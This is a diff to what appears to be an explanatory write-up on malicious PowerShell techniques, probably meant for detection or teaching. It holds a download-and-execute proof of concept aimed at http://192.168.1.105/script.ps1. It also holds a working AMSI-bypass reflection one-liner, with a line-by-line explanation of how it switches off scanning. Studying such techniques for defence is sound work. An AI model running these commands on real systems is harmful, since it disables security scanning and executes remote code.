@@ -35,9 +35,30 @@ from malicious powershell use.
    Proof of Concept: `$Text = "Invoke-Expression (Invoke-WebRequest -UseBasicParsing 'http://192.168.1.105/script.ps1')"`
    <img width="851" height="717" alt="image" src="https://github.com/user-attachments/assets/54252204-a5ff-497c-a8e5-662fca9d29ad" />
 5. AMSI Bypass
-   Attackers 
 
-   Proof of concept: `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null, $true)
+ `[Ref].Assembly`
+
+Accesses the currently running PowerShell assembly (code base).
+
+[Ref] is a .NET class used to reflect over types.
+
+`.GetType('System.Management.Automation.AmsiUtils')`
+
+This loads the internal PowerShell class AmsiUtils, which handles AMSI integration.
+
+ `.GetField('amsiInitFailed','NonPublic,Static')`
+
+This uses .NET Reflection to access a private static field called amsiInitFailed.
+
+That field tracks whether AMSI was successfully initialized in the process.
+
+`.SetValue($null, $true)`
+
+Sets the value of amsiInitFailed to $true, which tricks PowerShell into thinking AMSI has already failed.
+
+As a result, PowerShell skips AMSI scanning for any future code in that session.
+
+Proof of concept: `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null, $true)
 Add-Type -AssemblyName PresentationFramework
 [System.Windows.MessageBox]::Show('AMSI bypass simulated.')
 `
